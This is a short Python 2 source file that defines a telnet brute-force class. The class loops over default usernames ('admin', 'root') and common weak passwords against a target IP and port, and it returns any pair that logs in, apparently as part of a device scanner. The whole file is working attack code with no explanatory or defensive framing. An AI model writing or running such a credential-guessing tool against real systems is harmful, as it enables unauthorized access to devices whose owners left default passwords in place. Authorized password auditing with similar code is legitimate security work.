#!/usr/bin/env python
import os
import sys
import time
import telnetlib


class Brutetelnet():
    def __init__(self, verbose=False):
        self.users = ["admin", "root"]
        self.passwds = ["password", "admin", "123456", "qwerty", "password1"]
        self.verbose = verbose

    def try_user_pass(self, ip, port, user, passwd, timeout=3):
        telnet = telnetlib.Telnet(ip, port, timeout)
        telnet.read_until("login: ", 2)
        telnet.write(user + "\n")
        telnet.read_until("Password: ", 2)
        telnet.write(passwd + "\n")
        for x in xrange(timeout):
            result = telnet.read_very_eager().strip()
            if len(result) > 1:
                if "incorrect" not in result and passwd != result:
                    return True
            time.sleep(1)
        return False

    def login(self, ip, port, timeout=3):
        for user in self.users:
            for passwd in self.passwds:
                if self.verbose:
                    print "trying: %s %s" % (user, passwd)
                if self.try_user_pass(ip, port, user, passwd, timeout):
                    return user, passwd
        return "unknown", "unknown"

    def scan_port(self, ip, port, timeout=3):
        result = {"ip": ip,
                  "port": port,
                  "user": "",
                  "password": "",
                  "time": time.time()}
        try:
            user, password = self.login(ip, port, timeout)
            result["user"] = user
            result["password"] = password
        except KeyboardInterrupt as e:raise(e)
        except Exception as e:
            result["error"] = repr(e)
            sys.stdout.write(result["error"])
            sys.stdout.write("\n[Error] run\n")
        return result
